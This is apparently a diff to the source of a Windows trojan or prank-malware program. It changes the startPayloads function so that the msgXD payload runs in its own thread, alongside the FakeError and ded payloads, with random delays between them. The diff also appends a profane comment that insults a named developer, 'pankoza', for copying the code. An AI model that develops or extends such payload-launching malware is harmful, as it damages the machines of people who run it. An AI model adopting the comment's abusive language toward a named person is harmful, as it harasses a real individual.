@@ -1922,7 +1922,7 @@ void startPayloads() {
 	thread = CreateThread(0, 0, FakeError, 0, 0, &ID);
 
     Sleep(random() % 5000 + 340);
-    msgXD();
+    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)msgXD, 0, 0, &ID);
     Sleep(random() % 500 + 340);
     thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
     // thanks tabnine
@@ -2095,3 +2095,17 @@ void startPayloads() {
     
 	//startPayloads();
 }
+
+// message for SKIDDERS (aka pankoza and another shitty skidders)
+/*
+Read the fucking LICENSE part of every file i put (MIT License) instead of
+insert every single line of my code into your "new "original" trojan """noskid""""
+your fucking son of a bitch.
+
+If you are an motherfucker who dont even whats to read (pankoza), heres an simplified
+version of the MIT License:
+
+Fuck the way you gonna use the code, give credits for every part you stole
+
+Follow the license dumbass.
+*/
